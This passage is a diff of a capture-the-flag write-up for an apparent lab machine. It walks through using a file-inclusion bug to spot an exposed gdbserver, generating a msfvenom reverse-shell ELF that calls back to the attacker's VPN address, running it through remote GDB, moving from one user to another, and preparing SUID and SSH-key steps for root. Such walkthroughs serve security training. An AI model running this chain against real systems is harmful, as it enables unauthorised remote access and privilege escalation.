@@ -193,7 +193,11 @@ done
 ![A](./images/for4.jpg)
 
 
-This eventually identified an interesting process.
+It iterates through Process IDs (PIDs) 1 to 1000 , leveraging the web application's LFI vulnerability to read /proc/[PID]/cmdline. By filtering the output for '6048', it identifies the exact PID and command running the service on port 6048—revealing that gdbserver is the underlying binary
+
+
+This tells us that port 6048 was being used by gdbserver this means we could connect to the airplane process remotely (gdbserver : is a program that allows a debugger such as GDB to connect to another machine and control a program remotely)
+
 
 I then examined the process status:
 
@@ -283,32 +287,38 @@ Identify gdbserver
 Connect with GDB
  ↓
 Execute reverse-shell payload
-13. Preparing the Payload
+. Preparing the Payload
 
-I first verified that msfvenom was available:
+We need to find our kali vpn ip because we want the target to send us a response
 
-which msfvenom
+ip addr show tun0
+
+![A](./images/tun0.jpg)
+
+I first verified that msfvenom was available.
 
 
-
-
-I generated a Linux x64 reverse-shell ELF payload:
+then i generated a Linux x64 reverse-shell ELF payload:
+![A](./images/rshell1.jpg)
+![A](./images/rshell2.jpg)
 
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_TUN0_IP LPORT=4444 -f elf -o airplane_payload.elf
 
-
+![A](./images/msf.jpg)
+![A](./images/msfvenom.jpg)
 
 
 I verified the generated file:
 
 file airplane_payload.elf
-
+![A](./images/find_port.jpg)
+![A](./images/payload.jpg)
 
 
 
 I also inspected the payload to make sure it contained the expected network configuration.
 
-14. Starting the Listener
+. Starting the Listener
 
 Before executing the payload, I started a Netcat listener on my Kali machine:
 
@@ -329,7 +339,7 @@ Target
 
 
 
-15. Connecting to gdbserver
+. Connecting to gdbserver
 
 I started GDB:
 
@@ -350,7 +360,7 @@ The target architecture was checked during the process.
 
 
 
-16. Executing the Payload
+. Executing the Payload
 
 After establishing the remote GDB connection, I uploaded/configured the payload and executed it through the remote debugging session.
 
@@ -363,7 +373,7 @@ airplane_payload.elf
 
 The gdbserver executed the payload, causing the target machine to initiate a connection back to my Netcat listener.
 
-17. Obtaining the Reverse Shell
+. Obtaining the Reverse Shell
 
 The listener received the incoming connection.
 
@@ -385,9 +395,16 @@ The shell gave me access as:
 
 hudson
 ![A](./images/1001.jpg)
+
+
+Then the target downloads the binary.elf
 ![A](./images/bash.jpg)
 ![A](./images/bash5.jpg)
 ![A](./images/binary.jpg)
+By doing this we changed the user from hudson to Carlos , after we confirm that we are logged as carlos we inspect carlos home and we found the user.txt file and we can see the txt inside and find the flag
+whoami
+ls -la /home/carlos
+cat /home/carlos/user.txt
 ![A](./images/carlos1.jpg)
 ![A](./images/carlos2.jpg)
 
@@ -400,31 +417,43 @@ hudson
 
 ![A](./images/curl_ssh.jpg)
 ![A](./images/elf.jpg)
-![A](./images/find_port.jpg)
+
 ![A](./images/flag_carlos.jpg)
 
+WE FOUND THE USER FLAG
+Next we need to have a root privileged to find the root flag
 
+First we will check our current privilege by running "id" we care only about euid=1000(carlos) because this is the effective identity
+
+We suspect that the file might be in the find program so we do
+
+ls -l /usr/bin/find
+We confirmed that this was a SUID program
+ls -la /home/carlos/.gnupg
+This will help us see if carlos have something interesting in his GPG configuration there was a private-key but its not usable so we generate an ssh key
+ssh-keygen -t rsa
+The file in which the key will be saved is
+/tmp/carlos_key
+So now two files were created
+/tmp/carlos_key
+/tmp/carlos_key.pub
+The private key or the first one proves that we are allowed to log in and the public or the second one is placed in the users authorized_keys file
 ![A](./images/gobuster.jpg)
 ![A](./images/grep_bin.jpg)
 ![A](./images/home_hudson.jpg)
 ![A](./images/hudson_cat.jpg)
 ![A](./images/hudson_exec.jpg)
 
-![A](./images/msf.jpg)
-![A](./images/msfvenom.jpg)
-
 
 ![A](./images/p6048access.jpg)
 
-![A](./images/payload.jpg)
 
 ![A](./images/proc_status.jpg)
 
-![A](./images/rshell1.jpg)
-![A](./images/rshell2.jpg)
+
 ![A](./images/show_arch.jpg)
 ![A](./images/ssh_carlos.jpg)
 ![A](./images/stty.jpg)
 ![A](./images/sudo_nmap.jpg)
 ![A](./images/systemctl.jpg)
-![A](./images/tun0.jpg)
+
